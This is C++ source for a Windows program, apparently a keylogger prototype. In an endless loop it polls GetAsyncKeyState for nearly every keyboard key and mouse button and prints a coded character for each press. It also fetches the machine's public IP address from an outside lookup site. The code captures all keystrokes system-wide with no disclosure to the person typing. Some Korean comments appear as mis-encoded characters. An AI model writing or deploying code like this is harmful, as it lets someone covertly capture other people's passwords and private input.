#include <iostream>
#include <windows.h>
#include <wininet.h>
#include <string>
#include <thread>

#pragma comment(lib, "wininet.lib") 


using namespace std;


static bool isRunning = true;


char Detect_events()
{
    string key;

    while (isRunning) {

        //���콺 �̺�Ʈ
        if (GetAsyncKeyState(VK_LBUTTON) & 0x0001) {
            //cout << "MOUSE - left click!" << endl;
            return 'Q';
        }
        else if (GetAsyncKeyState(VK_RBUTTON) & 0x0001) {
            //cout << "MOUSE - right click!" << endl;
            return 'W';
        }
        else if (GetAsyncKeyState(VK_MBUTTON) & 0x0001) {
            //cout << "MOUSE - center click!" << endl;
            return 'E';
        }
        else if (GetAsyncKeyState(VK_XBUTTON1) & 0x0001) {
            //cout << "MOUSE - x1 click!" << endl;
            return 'R';
        }
        else if (GetAsyncKeyState(VK_XBUTTON2) & 0x0001) {
            //cout << "MOUSE - x2 click!" << endl;
            return 'T';
        }

        //Ű���� �̺�Ʈ
        else if (GetAsyncKeyState(VK_BACK) & 0x0001) {
            //cout << "KEYBOARD - backspace!" << endl;
            return 'Y';
        }
        else if (GetAsyncKeyState(VK_RETURN) & 0x0001) {
            //cout << "KEYBOARD - enter!" << endl;
            return 'U';
        }
        else if (GetAsyncKeyState(VK_SHIFT) & 0x0001) {
            //cout << "KEYBOARD - shift!" << endl;
            return 'I';
        }
        else if (GetAsyncKeyState(VK_CONTROL) & 0x0001) {
            //cout << "KEYBOARD - ctrl!" << endl;
            return 'O';
        }
        else if (GetAsyncKeyState(VK_MENU) & 0x0001) {
            //cout << "KEYBOARD - alt!" << endl;
            return 'P';
        }
        else if (GetAsyncKeyState(VK_TAB) & 0x0001) {
            //cout << "KEYBOARD - tab!" << endl;
            return '{';
        }
        else if (GetAsyncKeyState(VK_CLEAR) & 0x0001) {
            //cout << "KEYBOARD - clear!" << endl;
            return '}';
        }
        else if (GetAsyncKeyState(VK_PAUSE) & 0x0001) {
            //cout << "KEYBOARD - pause!" << endl;
            return 'A';
        }
        else if (GetAsyncKeyState(VK_CAPITAL) & 0x0001) {
            //cout << "KEYBOARD - capslock!" << endl;
            return 'S';
        }
        else if (GetAsyncKeyState(VK_ESCAPE) & 0x0001) {
            //cout << "KEYBOARD - esc!" << endl;
            return 'D';
        }
        else if (GetAsyncKeyState(VK_SPACE) & 0x0001) {
            //cout << "KEYBOARD - space bar!" << endl;
            return 'F';
        }
        else if (GetAsyncKeyState(VK_PRIOR) & 0x0001) {
            //cout << "KEYBOARD - page up!" << endl;
            return 'G';
        }
        else if (GetAsyncKeyState(VK_NEXT) & 0x0001) {
            //cout << "KEYBOARD - page down!" << endl;
            return 'H';
        }
        else if (GetAsyncKeyState(VK_END) & 0x0001) {
            //cout << "KEYBOARD - end!" << endl;
            return 'J';
        }
        else if (GetAsyncKeyState(VK_HOME) & 0x0001) {
            //cout << "KEYBOARD - home!" << endl;
            return 'K';
        }
        else if (GetAsyncKeyState(VK_LEFT) & 0x0001) {
            //cout << "KEYBOARD - left!" << endl;
            return 'L';
        }
        else if (GetAsyncKeyState(VK_UP) & 0x0001) {
            //cout << "KEYBOARD - up!" << endl;
            return ':';
        }
        else if (GetAsyncKeyState(VK_RIGHT) & 0x0001) {
            //cout << "KEYBOARD - right!" << endl;
            return 'Z';
        }
        else if (GetAsyncKeyState(VK_DOWN) & 0x0001) {
            //cout < "KEYBOARD - down!" << endl;
            return 'X';
        }
        else if (GetAsyncKeyState(VK_PRINT) & 0x0001) {
            //cout << "KEYBOARD - print!" << endl;
            return 'V';
        }
        else if (GetAsyncKeyState(VK_EXECUTE) & 0x0001) {
            //cout << "KEYBOARD - execute!" << endl;
            return 'B';
        }
        else if (GetAsyncKeyState(VK_SNAPSHOT) & 0x0001) {
            //cout << "KEYBOARD - print screen!" << endl;
            return 'N';
        }
        else if (GetAsyncKeyState(VK_INSERT) & 0x0001) {
            //cout << "KEYBOARD - insert!" << endl;
            return 'M';
        }
        else if (GetAsyncKeyState(VK_DELETE) & 0x0001) {
            //cout << "KEYBOARD - delete!" << endl;
            return '<';
        }
        else if (GetAsyncKeyState(0x30) & 0x0001) {
            //cout << "KEYBOARD - 0!" << endl;
            return '0';
        }
        else if (GetAsyncKeyState(0x31) & 0x0001) {
            //cout << "KEYBOARD - 1!" << endl;
            return '1';
        }
        else if (GetAsyncKeyState(0x32) & 0x0001) {
            //cout << "KEYBOARD - 2!" << endl;
            return '2';
        }
        else if (GetAsyncKeyState(0x33) & 0x0001) {
            //cout << "KEYBOARD - 3!" << endl;
            return '3';
        }
        else if (GetAsyncKeyState(0x34) & 0x0001) {
            //cout << "KEYBOARD - 4!" << endl;
            return '4';
        }
        else if (GetAsyncKeyState(0x35) & 0x0001) {
            //cout < "KEYBOARD - 5!" << endl;
            return '5';
        }
        else if (GetAsyncKeyState(0x36) & 0x0001) {
            //cout << "KEYBOARD - 6!" << endl;
            return '6';
        }
        else if (GetAsyncKeyState(0x37) & 0x0001) {
            //cout << "KEYBOARD - 7!" << endl;
            return '7';
        }
        else if (GetAsyncKeyState(0x38) & 0x0001) {
            //cout << "KEYBOARD - 8!" << endl;
            return '8';
        }
        else if (GetAsyncKeyState(0x39) & 0x0001) {
            //cout << "KEYBOARD - 9!" << endl;
            return '9';
        }
        else if (GetAsyncKeyState(0x60) & 0x0001) {
            //cout << "KEYBOARD - 0!" << endl;
            return '0';
        }
        else if (GetAsyncKeyState(0x61) & 0x0001) {
            //cout << "KEYBOARD - 1!" << endl;
            return '1';
        }
        else if (GetAsyncKeyState(0x62) & 0x0001) {
            //cout << "KEYBOARD - 2!" << endl;
            return '2';
        }
        else if (GetAsyncKeyState(0x63) & 0x0001) {
            //cout << "KEYBOARD - 3!" << endl;
            return '3';
        }
        else if (GetAsyncKeyState(0x64) & 0x0001) {
            //cout << "KEYBOARD - 4!" << endl;
            return '4';
        }
        else if (GetAsyncKeyState(0x65) & 0x0001) {
            //cout << "KEYBOARD - 5!" << endl;
            return '5';
        }
        else if (GetAsyncKeyState(0x66) & 0x0001) {
            //cout << "KEYBOARD - 6!" << endl;
            return '6';
        }
        else if (GetAsyncKeyState(0x67) & 0x0001) {
            //cout << "KEYBOARD - 7!" << endl;
            return '7';
        }
        else if (GetAsyncKeyState(0x68) & 0x0001) {
            //cout << "KEYBOARD - 8!" << endl;
            return '8';
        }
        else if (GetAsyncKeyState(0x69) & 0x0001) {
            //cout << "KEYBOARD - 9!" << endl;
            return '9';
        }
        else if (GetAsyncKeyState(0x41) & 0x0001) {
            //cout << "KEYBOARD - A!" << endl;
            return 'a';
        }
        else if (GetAsyncKeyState(0x42) & 0x0001) {
            //cout << "KEYBOARD - B!" << endl;
            return 'b';
        }
        else if (GetAsyncKeyState(0x43) & 0x0001) {
            //cout << "KEYBOARD - C!" << endl;
            return 'c';
        }
        else if (GetAsyncKeyState(0x44) & 0x0001) {
            //cout << "KEYBOARD - D!" << endl;
            return 'd';
        }
        else if (GetAsyncKeyState(0x45) & 0x0001) {
            //cout << "KEYBOARD - E!" << endl;
            return 'e';
        }
        else if (GetAsyncKeyState(0x46) & 0x0001) {
            //cout << "KEYBOARD - F!" << endl;
            return 'f';
        }
        else if (GetAsyncKeyState(0x47) & 0x0001) {
            //cout << "KEYBOARD - G!" << endl;
            return 'g';
        }
        else if (GetAsyncKeyState(0x48) & 0x0001) {
            //cout << "KEYBOARD - H!" << endl;
            return 'h';
        }
        else if (GetAsyncKeyState(0x49) & 0x0001) {
            //cout << "KEYBOARD - I!" << endl;
            return 'i';
        }
        else if (GetAsyncKeyState(0x4A) & 0x0001) {
            //cout << "KEYBOARD - J!" << endl;
            return 'j';
        }
        else if (GetAsyncKeyState(0x4B) & 0x0001) {
            //cout << "KEYBOARD - K!" << endl;
            return 'k';
        }
        else if (GetAsyncKeyState(0x4C) & 0x0001) {
            //cout < "KEYBOARD - L!" << endl;
            return 'l';
        }
        else if (GetAsyncKeyState(0x4D) & 0x0001) {
            //cout << "KEYBOARD - M!" << endl;
            return 'm';
        }
        else if (GetAsyncKeyState(0x4E) & 0x0001) {
            //cout << "KEYBOARD - N!" << endl;
            return 'n';
        }
        else if (GetAsyncKeyState(0x4F) & 0x0001) {
            //cout << "KEYBOARD - O!" << endl;
            return 'o';
        }
        else if (GetAsyncKeyState(0x50) & 0x0001) {
            //cout << "KEYBOARD - P!" << endl;
            return 'p';
        }
        else if (GetAsyncKeyState(0x51) & 0x0001) {
            //cout << "KEYBOARD - Q!" << endl;
            return 'q';
        }
        else if (GetAsyncKeyState(0x52) & 0x0001) {
            //cout << "KEYBOARD - R!" << endl;
            return 'r';
        }
        else if (GetAsyncKeyState(0x53) & 0x0001) {
            //cout << "KEYBOARD - S!" << endl;
            return 's';
        }
        else if (GetAsyncKeyState(0x54) & 0x0001) {
            //cout << "KEYBOARD - T!" << endl;
            return 't';
        }
        else if (GetAsyncKeyState(0x55) & 0x0001) {
            //cout << "KEYBOARD - U!" << endl;
            return 'u';
        }
        else if (GetAsyncKeyState(0x56) & 0x0001) {
            //cout << "KEYBOARD - V!" << endl;
            return 'v';
        }
        else if (GetAsyncKeyState(0x57) & 0x0001) {
            //cout << "KEYBOARD - W!" << endl;
            return 'w';
        }
        else if (GetAsyncKeyState(0x58) & 0x0001) {
            //cout << "KEYBOARD - X!" << endl;
            return 'x';
        }
        else if (GetAsyncKeyState(0x59) & 0x0001) {
            //cout << "KEYBOARD - Y!" << endl;
            return 'y';
        }
        else if (GetAsyncKeyState(0x5A) & 0x0001) {
            //cout << "KEYBOARD - Z!" << endl;
            return 'z';
        }
        else if (GetAsyncKeyState(VK_LWIN) & 0x0001) {
            //cout << "KEYBOARD - window key!" << endl;
            return '>';
        }
        else if (GetAsyncKeyState(VK_RWIN) & 0x0001) {
            //cout << "KEYBOARD - window key!" << endl;
            return '>';
        }
        else if (GetAsyncKeyState(VK_APPS) & 0x0001) {
            //cout << "KEYBOARD - app!" << endl;
            return '?';
        }
        else if (GetAsyncKeyState(VK_SUBTRACT) & 0x0001) {
            //cout << "KEYBOARD - minus!" << endl;
            return '-';
        }
        else if (GetAsyncKeyState(VK_DECIMAL) & 0x0001) {
            //cout << "KEYBOARD - dot!" << endl;
            return '.';
        }
        else if (GetAsyncKeyState(VK_DIVIDE) & 0x0001) {
            //cout << "KEYBOARD - devide!" << endl;
            return '/';
        }
        else if (GetAsyncKeyState(VK_F1) & 0x0001) {
            //cout << "KEYBOARD - F1!" << endl;
            return '~';
        }
        else if (GetAsyncKeyState(VK_F2) & 0x0001) {
            //cout << "KEYBOARD - F2!" << endl;
            return '!';
        }
        else if (GetAsyncKeyState(VK_F3) & 0x0001) {
            //cout << "KEYBOARD - F3!" << endl;
            return '@';
        }
        else if (GetAsyncKeyState(VK_F4) & 0x0001) {
            //cout << "KEYBOARD - F4!" << endl;
            return '#';
        }
        else if (GetAsyncKeyState(VK_F5) & 0x0001) {
            //cout << "KEYBOARD - F5!" << endl;
            return '$';
        }
        else if (GetAsyncKeyState(VK_F6) & 0x0001) {
            //cout << "KEYBOARD - F6!" << endl;
            return '%';
        }
        else if (GetAsyncKeyState(VK_F7) & 0x0001) {
            //cout << "KEYBOARD - F7!" << endl;
            return '^';
        }
        else if (GetAsyncKeyState(VK_F8) & 0x0001) {
            //cout << "KEYBOARD - F8!" << endl;
            return '&';
        }
        else if (GetAsyncKeyState(VK_F9) & 0x0001) {
            //cout << "KEYBOARD - F9!" << endl;
            return '*';
        }
        else if (GetAsyncKeyState(VK_F10) & 0x0001) {
            //cout << "KEYBOARD - F10!" << endl;
            return '(';
        }
        else if (GetAsyncKeyState(VK_F11) & 0x0001) {
            //cout << "KEYBOARD - F11!" << endl;
            return ')';
        }
        else if (GetAsyncKeyState(VK_F12) & 0x0001) {
            //cout << "KEYBOARD - F12!" << endl;
            return '_';
        }
        else if (GetAsyncKeyState(VK_NUMLOCK) & 0x0001) {
            //cout << "KEYBOARD - numlock!" << endl;
            return '=';
        }

        //�߰��׸�
        else if (GetAsyncKeyState(0x15) & 0x0001) {
            //cout << "KEYBOARD - hangul!" << endl;
            return 'C';
        }
        else if (GetAsyncKeyState(0xAE) & 0x0001) {
            //cout << "KEYBOARD - ��������!" << endl;
            return '}';
        }
        else if (GetAsyncKeyState(0xAF) & 0x0001) {
            //cout << "KEYBOARD - ��������!" << endl;
            return '|';
        }
        else if (GetAsyncKeyState(0xAD) & 0x0001) {
            //cout << "KEYBOARD - �������Ұ�!" << endl;
            return '/';
        }
        else if (GetAsyncKeyState(0xBB) & 0x0001) {
            //cout << "KEYBOARD - plus!" << endl;
            return '+';
        }
        else if (GetAsyncKeyState(0xBD) & 0x0001) {
            //cout << "KEYBOARD - minus!" << endl;
            return '-';
        }
        else if (GetAsyncKeyState(0xBE) & 0x0001) {
            //cout << "KEYBOARD - .!" << endl;
            return '.';
        }
        else if (GetAsyncKeyState(0xBC) & 0x0001) {
            //cout << "KEYBOARD - ,!" << endl;
            return ',';
        }

    }
}


string real_ip()
{
    HINTERNET net = InternetOpen(L"IP retriever", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET conn = InternetOpenUrl(net, L"http://myexternalip.com/raw", NULL, 0, INTERNET_FLAG_RELOAD, 0);

    char buffer[4096];
    DWORD read;

    InternetReadFile(conn, buffer, sizeof(buffer) / sizeof(buffer[0]), &read);
    InternetCloseHandle(net);

    return string(buffer, read);
}


int main()
{
    cout << real_ip();

    while(1)
        cout << Detect_events();
}